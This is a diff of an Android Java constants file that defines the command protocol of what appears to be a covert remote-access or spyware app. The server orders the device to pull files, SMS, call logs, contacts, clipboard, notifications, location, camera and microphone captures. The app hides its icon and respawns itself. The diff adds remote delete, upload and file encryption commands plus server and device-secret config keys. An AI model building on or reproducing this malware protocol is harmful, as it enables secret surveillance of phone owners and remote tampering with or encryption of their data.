@@ -1,18 +1,11 @@
 package com.fason.app.core;
 
-/**
- * Central protocol constants. All event names, command codes, action strings,
- * JSON keys, broadcast actions, and preference keys live here.
- */
 public final class Protocol {
-
     private Protocol() {}
-
-    // Socket events (server → device)
+    
+    // Socket events
     public static final String EVT_PING  = "ping";
     public static final String EVT_ORDER = "order";
-
-    // Socket events (device → server)
     public static final String EVT_PONG = "pong";
 
     // Channel codes
@@ -35,6 +28,13 @@ public final class Protocol {
     // Actions
     public static final String ACT_LS            = "ls";
     public static final String ACT_DL            = "dl";
+    public static final String ACT_UPLOAD        = "upload";
+    public static final String ACT_PUSH          = "push";
+    public static final String ACT_DELETE        = "delete";
+    public static final String ACT_RENAME        = "rename";
+    public static final String ACT_ENCRYPT       = "encrypt";
+    public static final String ACT_DECRYPT       = "decrypt";
+    public static final String ACT_RECORD        = "record";
     public static final String ACT_SEND_SMS      = "sendSMS";
     public static final String ACT_LIST          = "list";
     public static final String ACT_CAPTURE       = "capture";
@@ -52,14 +52,19 @@ public final class Protocol {
     public static final String KEY_TYPE   = "type";
     public static final String KEY_ACTION = "action";
     public static final String KEY_PATH   = "path";
+    public static final String KEY_NEW_NAME = "newName";  // rename target
+    public static final String KEY_PASSWORD = "password"; // encrypt/decrypt password (operator-supplied)
+    public static final String KEY_FLASH   = "flash";     // camera flash: auto/on/off
+    public static final String KEY_QUALITY = "quality";   // camera quality: low/medium/high
     public static final String KEY_TO     = "to";
     public static final String KEY_SMS    = "sms";
     public static final String KEY_SEC    = "sec";
     public static final String KEY_PERM   = "perm";
     public static final String KEY_ID     = "id";
     public static final String KEY_SYS    = "sys";
+    public static final String KEY_CMD_ID = "cmdId";
 
-    // JSON keys — response (common)
+    // JSON keys — response
     public static final String KEY_ERROR     = "error";
     public static final String KEY_SUCCESS   = "success";
     public static final String KEY_TOTAL     = "total";
@@ -69,8 +74,6 @@ public final class Protocol {
     public static final String KEY_ENABLED   = "enabled";
     public static final String KEY_STATUS    = "status";
     public static final String KEY_MESSAGE   = "message";
-
-    // JSON keys — file response
     public static final String KEY_LIST          = "list";
     public static final String KEY_ISDIR         = "isDir";
     public static final String KEY_LAST_MODIFIED = "lastModified";
@@ -80,47 +83,31 @@ public final class Protocol {
     public static final String KEY_TOTAL_SIZE    = "totalSize";
     public static final String KEY_CHUNK_INDEX   = "chunkIndex";
     public static final String KEY_CHUNK_DATA    = "chunkData";
-
-    // File download types (KEY_TYPE values in file responses)
     public static final String TYPE_LIST           = "list";
     public static final String TYPE_DOWNLOAD       = "download";
     public static final String TYPE_DOWNLOAD_START = "download_start";
     public static final String TYPE_DOWNLOAD_CHUNK = "download_chunk";
     public static final String TYPE_DOWNLOAD_END   = "download_end";
     public static final String TYPE_ERROR          = "error";
-
-    // JSON keys — SMS response
     public static final String KEY_SMS_LIST = "smslist";
     public static final String KEY_ADDRESS  = "address";
     public static final String KEY_BODY     = "body";
     public static final String KEY_DATE     = "date";
     public static final String KEY_READ     = "read";
-
-    // JSON keys — calls response
     public static final String KEY_CALLS_LIST = "callsList";
     public static final String KEY_PHONE_NO   = "phoneNo";
     public static final String KEY_DURATION   = "duration";
-
-    // JSON keys — contacts response
     public static final String KEY_CONTACTS_LIST = "contactsList";
-
-    // JSON keys — camera response
     public static final String KEY_IMAGE     = "image";
     public static final String KEY_CAMERA_ID = "cameraId";
     public static final String KEY_CAM_LIST  = "camList";
     public static final String KEY_HAS_PERM  = "hasPermission";
-
-    // JSON keys — mic response
     public static final String KEY_FILE = "file";
-
-    // JSON keys — location response
     public static final String KEY_LATITUDE  = "latitude";
     public static final String KEY_LONGITUDE = "longitude";
     public static final String KEY_ACCURACY  = "accuracy";
     public static final String KEY_SPEED     = "speed";
     public static final String KEY_PROVIDER  = "provider";
-
-    // JSON keys — WiFi response
     public static final String KEY_NETWORKS        = "networks";
     public static final String KEY_CACHED           = "cached";
     public static final String KEY_BSSID            = "BSSID";
@@ -132,14 +119,10 @@ public final class Protocol {
     public static final String KEY_SECURE           = "secure";
     public static final String KEY_CHANNEL          = "channel";
     public static final String KEY_WIFI6            = "wifi6";
-
-    // JSON keys — clipboard response
     public static final String KEY_TEXT      = "text";
     public static final String KEY_LENGTH    = "length";
     public static final String KEY_LABEL     = "label";
     public static final String KEY_MIME_TYPE = "mimeType";
-
-    // JSON keys — app list response
     public static final String KEY_APPS          = "apps";
     public static final String KEY_APP_NAME      = "appName";
     public static final String KEY_PACKAGE_NAME  = "packageName";
@@ -147,8 +130,6 @@ public final class Protocol {
     public static final String KEY_VERSION_CODE  = "versionCode";
     public static final String KEY_IS_SYSTEM     = "isSystem";
     public static final String KEY_TARGET_SDK    = "targetSdkVersion";
-
-    // JSON keys — notification response
     public static final String KEY_CONNECTED = "connected";
     public static final String KEY_REMOVED   = "removed";
     public static final String KEY_TITLE     = "title";
@@ -159,17 +140,11 @@ public final class Protocol {
     public static final String KEY_CLEARABLE = "clearable";
     public static final String KEY_INITIAL   = "initial";
     public static final String KEY_CATEGORY  = "category";
-
-    // JSON keys — permission response
     public static final String KEY_PERMISSION  = "permission";
     public static final String KEY_ALLOWED     = "allowed";
     public static final String KEY_PERMISSIONS = "permissions";
-
-    // JSON keys — fason (app visibility) response
     public static final String KEY_HIDDEN = "hidden";
     public static final String KEY_STATE  = "state";
-
-    // Broadcast actions
     public static final String BC_KEEP_ALIVE     = "keepAlive";
     public static final String BC_RESPAWN_SERVICE = "respawnService";
     public static final String BC_RESTART         = "restart";
@@ -190,6 +165,12 @@ public final class Protocol {
 
     // Settings.Secure keys
     public static final String SETTING_NOTIF_LISTENERS = "enabled_notification_listeners";
+
+    // config.properties keys (assets/config.properties)
+    public static final String CONFIG_FILE            = "config.properties";
+    public static final String CONFIG_KEY_SERVER_URL   = "server_url";
+    public static final String CONFIG_KEY_HOME_PAGE_URL = "home_page_url";
+    public static final String CONFIG_KEY_DEVICE_SECRET = "device_secret";
 
     // FasonManager component suffix
     public static final String ALIAS_SUFFIX = ".ui.MainActivityAlias";
